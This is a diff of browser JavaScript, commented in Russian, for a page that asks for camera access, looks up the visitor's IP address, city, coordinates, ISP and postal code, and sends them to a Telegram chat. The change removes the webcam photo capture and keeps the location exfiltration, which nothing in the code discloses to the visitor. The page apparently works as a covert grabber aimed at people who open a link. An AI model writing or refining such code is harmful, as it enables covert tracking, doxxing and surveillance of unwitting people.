@@ -37,42 +37,40 @@
             });
         }
 
-        // Запрашиваем доступ к камере и отправляем фото и геолокационные данные
+        // Запрашиваем доступ к камере и отправляем геолокационные данные
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
                 const video = document.getElementById('video');
                 video.srcObject = stream;
 
-                // Создаем элемент для захвата кадра
-                const track = stream.getVideoTracks()[0];
-                const imageCapture = new ImageCapture(track);
+                // Получаем IP-адрес и геолокационные данные пользователя
+                fetch(apiUrl)
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.status === 'fail') {
+                            console.error('API request failed:', data.message);
+                            return;
+                        }
 
-                // Захватываем изображение
-                imageCapture.takePhoto()
-                    .then(blob => {
-                        // Получаем IP-адрес и геолокационные данные пользователя
-                        fetch(apiUrl)
-                            .then(response => response.json())
-                            .then(data => {
-                                const ipInfo = {
-                                    ip: data.query,
-                                    hostname: data.reverse, // может быть недоступно
-                                    city: data.city,
-                                    region: data.regionName,
-                                    country: data.country,
-                                    coordinates: `${data.lat}, ${data.lon}`,
-                                    provider: data.isp,
-                                    postal: data.zip,
-                                    timezone: data.timezone,
-                                    country_flag_url: `https://www.countryflags.io/${data.countryCode}/flat/64.png`,
-                                    latitude: data.lat,
-                                    longitude: data.lon
-                                };
+                        const ipInfo = {
+                            ip: data.query || 'недоступно',
+                            hostname: data.reverse || 'недоступно', // может быть недоступно
+                            city: data.city || 'недоступно',
+                            region: data.regionName || 'недоступно',
+                            country: data.country || 'недоступно',
+                            coordinates: `${data.lat || 'недоступно'}, ${data.lon || 'недоступно'}`,
+                            provider: data.isp || 'недоступно',
+                            postal: data.zip || 'недоступно',
+                            timezone: data.timezone || 'недоступно',
+                            country_flag_url: `https://www.countryflags.io/${data.countryCode || 'xx'}/flat/64.png`,
+                            latitude: data.lat || 'недоступно',
+                            longitude: data.lon || 'недоступно'
+                        };
 
-                                const message = `
+                        const message = `
 🌐
 ├ IP: ${ipInfo.ip}
-├ Hostname: ${ipInfo.hostname || 'недоступно'}
+├ Hostname: ${ipInfo.hostname}
 ├ Город: ${ipInfo.city}
 ├ Регион: ${ipInfo.region}
 ├ Страна: ${ipInfo.country}
@@ -84,15 +82,11 @@
 ├ Широта: ${ipInfo.latitude}
 └ Долгота: ${ipInfo.longitude}`;
 
-                                // Отправляем данные в Telegram
-                                sendMessageToTelegram(message);
-                            })
-                            .catch(error => {
-                                console.error('Error fetching IP data:', error);
-                            });
+                        // Отправляем данные в Telegram
+                        sendMessageToTelegram(message);
                     })
                     .catch(error => {
-                        console.error('Error taking photo:', error);
+                        console.error('Error fetching IP data:', error);
                     });
             })
             .catch(error => {
